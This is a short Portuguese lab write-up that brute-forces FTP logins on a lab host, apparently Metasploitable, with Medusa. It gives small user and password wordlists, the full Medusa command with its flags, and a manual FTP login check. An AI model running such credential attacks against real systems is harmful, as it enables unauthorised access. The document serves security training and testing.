🎯 Cenário 1: Força Bruta em FTP

Objetivo
Testar uma lista de senhas contra um usuário conhecido (msfadmin) no serviço FTP.

Preparação da Wordlist
Foi criada uma wordlist controlada em wordlists/ForcaBruta_Ftp/users.txt e password.txt contendo usuários e senhas comuns e a credencial válida do laboratório:

users.txt:
  user
  msfadmin
  admin
  root

password.txt:
  123456
  admin
  password
  msfadmin
  root

Execução

  Bash
  medusa -h 192.168.56.101 -U users.txt -P password.txt -M ftp -t 6

  -h: IP do host alvo.

  -U: Caminho para a wordlist de usuários.

  -P: Caminho para a wordlist de senhas.

  -M ftp: Módulo FTP do Medusa.

  -t 6: Limita a 6 threads simultâneas para evitar sobrecarga no serviço.

Validação do Acesso
Após a identificação da senha pelo Medusa ([SUCCESS]), o acesso foi validado manualmente via cliente FTP:
  
  Bash
  ftp 192.168.56.101